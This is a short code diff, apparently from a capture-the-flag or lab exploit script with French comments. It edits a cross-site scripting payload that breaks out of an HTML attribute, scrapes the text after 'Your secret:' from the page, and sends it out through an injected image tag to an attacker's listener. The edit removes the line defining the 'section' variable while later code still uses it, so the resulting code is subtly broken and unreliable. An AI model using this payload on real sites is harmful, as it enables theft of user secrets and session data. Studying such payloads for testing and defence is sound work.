@@ -33,8 +33,6 @@
         // Ajout des échappements nécessaires (">< et <!--) pour sortir de l'attribut 'value' HTML.
         const MALICIOUS_PAYLOAD = "<script>" +
             "setTimeout(function() {" +
-                "var section = document.querySelector('section');" + 
-                "if (section) {" +
                     "var text = section.innerText;" + 
                     // 1. Extrait le secret en se basant sur le texte d'ancrage "Your secret:"
                     "var secret = text.split('Your secret:')[1].trim();" + 
@@ -48,8 +46,6 @@
                     "document.body.appendChild(img);" +
                     
                     "console.log('Secret exfiltrated! Check your listener logs.');" +
-                "} else {" +
-                    "console.error('Exfiltration Error: Section not found.');" +
                 "}" +
             "}, 1000);</script>";
         
